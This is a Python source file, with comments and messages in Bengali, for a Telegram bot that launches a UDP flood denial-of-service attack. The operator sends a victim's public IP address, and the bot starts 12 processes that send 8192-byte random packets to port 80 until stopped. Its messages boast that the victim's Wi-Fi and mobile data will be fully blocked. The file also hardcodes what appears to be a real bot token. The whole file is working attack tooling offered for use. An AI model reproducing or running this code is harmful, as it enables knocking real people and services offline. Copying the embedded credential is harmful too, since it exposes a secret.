import os
import socket
import multiprocessing
import random
import time
import sys
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from colorama import Fore, Style, init

# কনসোল কালার ইনিশিয়ালাইজ
init()

# --- কনফিগারেশন ---
TOKEN = "8620529154:AAHcN6529pcI8F6i417poylsymr0yLFkEhQ"
manager = multiprocessing.Manager()
shared_data = manager.dict()
shared_data['attacking'] = False
shared_data['packets_sent'] = 0
shared_data['target'] = ""

# ১০০% নেট ব্লক করার এক্সট্রিম সুপারনোভা ইঞ্জিন
def supernova_extreme_flood(ip, port, shared_dict):
    # হাই-স্পিড UDP সকেট তৈরি
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # বিশাল সাইজের ডাবল-লেয়ার প্যাকেট (৮১৯২ বাইট) যা ব্যান্ডউইথ পুরোপুরি শুষে নেবে
    # এটি ওয়াইফাই এবং মোবাইল ডাটা উভয়কেই জ্যাম করতে সক্ষম
    payload = random._urandom(8192) 
    
    while shared_dict['attacking']:
        try:
            # সরাসরি হাই-ফ্রিকোয়েন্সি প্যাকেট সেন্ড
            client.sendto(payload, (ip, port))
            shared_dict['packets_sent'] += 1
        except:
            # সকেট ওভারফ্লো হলে সাময়িকভাবে এড়িয়ে যাওয়া
            continue
    client.close()

# ১. স্টার্ট কমান্ড (সরাসরি চ্যাটে বাটন আসবে)
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [KeyboardButton("🚀 START EXTREME ATTACK")],
        [KeyboardButton("📊 LIVE STATUS"), KeyboardButton("🛑 STOP ATTACK")]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    
    welcome_text = (
        "🔥 *MR DEVELOPER - SUPERNOVA V4 (FINAL)* 🔥\n\n"
        "এটি রেলওয়ে সার্ভারের ১২টি কোর ব্যবহার করে ১০০% নেট জ্যাম করবে।\n\n"
        "⚠️ *সতর্কতা:* ভিকটিমের **Public IP** ব্যবহার করুন।\n"
        "ওয়াইফাই এবং মোবাইল ডাটা উভয়ই কাজ করা বন্ধ করে দিবে।"
    )
    await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode='Markdown')

# ২. মেইন কমান্ড ও মেসেজ হ্যান্ডলার
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global shared_data
    user_text = update.message.text

    # ১. অ্যাটাক শুরুর অপশন
    if user_text == "🚀 START EXTREME ATTACK":
        await update.message.reply_text("🎯 *ভিকটিমের Public IP Address পাঠান:*", parse_mode='Markdown')
        context.user_data['waiting_for_ip'] = True
        return

    # ২. লাইভ স্ট্যাটাস আপডেট
    if user_text == "📊 LIVE STATUS":
        if shared_data['attacking']:
            await update.message.reply_text(
                f"📡 *LIVE NETWORK STATUS:*\n\n"
                f"📍 Target: `{shared_data['target']}`\n"
                f"📤 Total Packets: `{shared_data['packets_sent']}`\n"
                f"🔥 Power: Supernova (Extreme)\n"
                f"📶 Status: Network Blocking Active", 
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text("❌ কোনো অ্যাটাক বর্তমানে রানিং নেই।")
        return

    # ৩. অ্যাটাক বন্ধ করার অপশন
    if user_text == "🛑 STOP ATTACK":
        shared_data['attacking'] = False
        await update.message.reply_text("✅ *অ্যাটাক সফলভাবে বন্ধ করা হয়েছে। ডিভাইসটি এখন স্বাভাবিক হবে।*", parse_mode='Markdown')
        print(Fore.YELLOW + f"[!] Attack stopped on {shared_data['target']}" + Style.RESET_ALL)
        return

    # ৪. আইপি পাওয়ার পর অ্যাটাক প্রসেস
    if context.user_data.get('waiting_for_ip'):
        target_ip = user_text.strip()
        context.user_data['waiting_for_ip'] = False
        
        shared_data['attacking'] = True
        shared_data['target'] = target_ip
        shared_data['packets_sent'] = 0
        
        await update.message.reply_text(
            f"⚔️ *SUPERNOVA ATTACK INITIALIZED!*\n\n"
            f"📍 *Target IP:* `{target_ip}`\n"
            f"🚀 *Method:* Multi-Core UDP Flooding\n"
            f"📡 *Result:* ভিকটিমের ইন্টারনেট এখন পুরোপুরি বন্ধ (Blocked) হয়ে যাবে।",
            parse_mode='Markdown'
        )
        
        print(Fore.RED + f"\n[!] Attacking IP: {target_ip} with 12 Extreme Processes..." + Style.RESET_ALL)

        # রেলওয়ে সার্ভারের সর্বোচ্চ ক্ষমতা ব্যবহার করতে ১২টি আলাদা প্রসেস চালু করা
        for _ in range(12):
            p = multiprocessing.Process(target=supernova_extreme_flood, args=(target_ip, 80, shared_data))
            p.daemon = True
            p.start()

# ৩. মেইন ফাংশন (বট রান)
def main():
    print(Fore.CYAN + "MR DEVELOPER EXTREME SYSTEM STARTING..." + Style.RESET_ALL)
    
    # অ্যাপ্লিকেশন বিল্ড
    app = Application.builder().token(TOKEN).build()

    # হ্যান্ডলার অ্যাড
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    print(Fore.GREEN + "BOT IS LIVE ON TELEGRAM! SYSTEM SECURED." + Style.RESET_ALL)
    app.run_polling()

if __name__ == "__main__":
    main()
    
